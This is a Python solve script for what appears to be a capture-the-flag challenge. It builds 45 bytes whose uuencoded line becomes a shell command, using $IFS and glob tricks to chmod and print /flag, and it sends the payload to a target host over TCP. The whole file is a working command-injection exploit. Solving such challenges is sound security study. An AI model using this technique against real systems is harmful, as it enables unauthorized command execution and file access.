#!/usr/bin/env python3
"""uushell - build and send the single uuencode data line that `sh` will execute.

The service is `uuencode x | sed -n 2p | sh`: whatever data line uuencode emits for
our stdin becomes the script. uuencode writes chr(6bit+32) per 6-bit group, so a
45-byte input yields exactly one 61-char line whose first character is forced to
chr(45+32) == 'M' - we reuse that 'M' as the function name.

    python3 solve.py                 # show the line
    python3 solve.py --emit > p.bin  # raw bytes to feed to uuencode (45 bytes)
    python3 solve.py --tcp HOST PORT # send over plain TCP and print the reply
"""
import socket
import sys

# Uppercase only: uuencode characters are 0x21..0x5f (+ backtick for 0), so there is
# no lowercase, no space, no '|', no '{' '}'. $IFS stands in for spaces.
#   M()(...)        define function M, subshell body -> positional params, no braces
#   $4$IFS\500$IFS????;$2   chmod 500 <4-letter top-level dirs> (only /flag is ours)
#   M$IFS*/?[!2]??? call 1: glob -> $2=bin/chcon $4=bin/chmod
#   M$IFS/????      call 2: glob -> $2=/flag $4=/proc
PAYLOAD = r"()($4$IFS\500$IFS????;$2)2>&1;M$IFS*/?[!2]???;M$IFS/????"


def pad(s, n, fill=";"):
    """Fill to n chars. The filler must start with a metacharacter."""
    assert len(s) <= n, len(s)
    return s + fill + "#" * (n - len(s) - 1)


def pack(values):
    """15 groups of four 6-bit values -> the 45 bytes uuencode turns back into them."""
    out = bytearray()
    for i in range(0, len(values), 4):
        v0, v1, v2, v3 = values[i:i + 4]
        out.append(((v0 << 2) | (v1 >> 4)) & 0xFF)
        out.append((((v1 & 0x0F) << 4) | (v2 >> 2)) & 0xFF)
        out.append((((v2 & 0x03) << 6) | v3) & 0xFF)
    return bytes(out)


def build():
    line = "M" + pad(PAYLOAD, 60)
    assert len(line) == 61 and line[0] == chr(45 + 32)
    return line, pack([ord(c) - 32 for c in line[1:]])


def recv_all(s):
    buf = bytearray()
    while True:
        d = s.recv(4096)
        if not d:
            return bytes(buf)
        buf += d


def main():
    line, raw = build()
    if len(sys.argv) == 1:
        print(line)
        print(f"{len(line)} chars, {len(raw)} raw bytes")
        return
    if sys.argv[1] == "--emit":
        sys.stdout.buffer.write(raw)
        return
    if sys.argv[1] == "--tcp":
        host, port = sys.argv[2], int(sys.argv[3])
        s = socket.create_connection((host, port), timeout=20)
        s.sendall(raw)
        s.shutdown(socket.SHUT_WR)      # uuencode emits nothing before EOF
        out = recv_all(s)
        sys.stdout.write(out.decode("latin-1"))
        return
    sys.exit(__doc__)


if __name__ == "__main__":
    main()
